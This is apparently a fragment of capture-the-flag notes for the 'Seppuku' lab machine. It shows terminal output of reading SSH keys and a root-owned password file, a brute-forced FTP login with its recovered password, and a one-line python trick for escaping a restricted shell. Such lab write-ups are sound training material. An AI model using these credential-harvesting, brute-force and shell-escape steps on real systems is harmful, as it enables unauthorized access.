seppuku@seppuku:/home/tanto/.ssh$ cat authorized_keys  
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKkmXCMpd/QXhi8vaB/C+hS68Ht+4Ywx8J7jWAsKxOyV45TLYIlf6g3BVUo+mXpNgjidc8ZuLB8bOjGbQVlrsP3Kvzc6DC68wynzc6RVzAv2/7Htq0rwABVnQ2O848aS8SEHas9LaYqDXFEpcIzukDQpI6gNuT1yg6lp2ODgbR/Vg9avCnqIt8gSt9jb7mFLtDJNCm5GYe5Hh4osXU0VGnyBi40JW2vSfZS7qFa4jtFYEZBkkmiPwsqN9FFiYoanKqIZN1HL7zILIC5PnmyG4LNe5z7/ccTaMAI4Pz6lI8qPDHObh+5pJ8FNSQd/KGJIoiSinZh8gMspE8zx0afnO5

  

  

seppuku@seppuku:/home$ cd seppuku/  
seppuku@seppuku:~$ ls -la  
total 32  
drwxr-xr-x 3 seppuku seppuku 4096 Sep 1 2020 .  
drwxr-xr-x 5 root root 4096 May 13 2020 ..  
-rw-r--r-- 1 seppuku seppuku 220 May 13 2020 .bash_logout  
-rw-r--r-- 1 seppuku seppuku 3526 May 13 2020 .bashrc  
drwx------ 3 seppuku seppuku 4096 May 13 2020 .gnupg  
-rw-r--r-- 1 seppuku seppuku 33 Jun 5 06:25 local.txt  
-rw-r--r-- 1 root root 20 May 13 2020 .passwd  
-rw-r--r-- 1 seppuku seppuku 807 May 13 2020 .profile  
seppuku@seppuku:~$ cat .passwd  
12345685213456!@!@A

  

[DATA] attacking ftp://192.168.226.90:21/  
[21][ftp] host: 192.168.226.90 login: seppuku password: eeyoree

  

seppuku@seppuku:/home$ ls  
samurai seppuku tanto

  

if get a rbash, can use

```Bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```